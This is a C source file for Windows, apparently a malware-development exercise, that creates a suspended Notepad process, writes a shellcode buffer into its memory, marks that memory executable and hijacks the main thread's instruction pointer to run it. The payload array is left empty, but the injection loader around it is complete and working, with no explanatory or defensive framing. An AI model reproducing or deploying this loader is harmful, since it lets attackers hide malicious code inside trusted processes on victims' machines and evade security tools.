#include<stdio.h>
#include<windows.h>

#pragma warning (disable:4996)

#define TARGER_PRCESS "Notepad.exe"

unsigned char Payload[] = {
	
};

BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	CHAR lpPath[MAX_PATH * 2]; // contains the whole path to the created process
	CHAR WDIR[MAX_PATH];		// contains the path to the system32 (the default path for installing applications)

	STARTUPINFO Si = { 0 };
	PROCESS_INFORMATION Pi = { 0 };

	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFO);

	if (!GetEnvironmentVariableA("WINDIR", WDIR, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	sprintf(lpPath, "%s\\System32\\%s", WDIR, lpProcessName); // creating the path to the process

	if (!CreateProcessA(
		NULL,					// No module name (use command line)
		lpPath,					// Command line
		NULL,					// Process handle not inheritable
		NULL,					// Thread handle not inheritable
		FALSE,					// Set handle inheritance to FALSE
		CREATE_SUSPENDED,		// creation flags	
		NULL,					// Use parent's environment block
		NULL,					// Use parent's starting directory 
		&Si,					// Pointer to STARTUPINFO structure
		&Pi)) {					// Pointer to PROCESS_INFORMATION structure

		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	if (*dwProcessId == NULL | *hProcess == NULL | *hThread == NULL) {
		return FALSE;
	}

	return TRUE;
}

BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, OUT PVOID* pAddress) {

	SIZE_T sNumberOfBytesWriten = NULL;
	DWORD dwOldProtection = NULL;

	*pAddress = VirtualAllocEx(hProcess, NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*pAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, *pAddress, pShellcode, sShellcodeSize, &sNumberOfBytesWriten) || sShellcodeSize != sNumberOfBytesWriten) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!VirtualProtectEx(hProcess, *pAddress, sShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;

}

BOOL RemoteThreadHijack(IN HANDLE hThread, IN PVOID pAddress) {

	CONTEXT ThreadCTX = { .ContextFlags = CONTEXT_CONTROL };

	if (!GetThreadContext(hThread, &ThreadCTX)) {
		printf("\n\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	ThreadCTX.Rip = pAddress;

	if (!SetThreadContext(hThread, &ThreadCTX)) {
		printf("\n\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;

}

int main() {

	DWORD dwProcessId = NULL;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;

	PVOID pAddress = NULL;

	if (!CreateSuspendedProcess(TARGER_PRCESS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}

	if (!InjectShellcodeToRemoteProcess(hProcess, Payload, sizeof(Payload), &pAddress)) {
		return -1;
	}

	if (!RemoteThreadHijack(hThread, pAddress)) {
		return -1;
	}

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;

}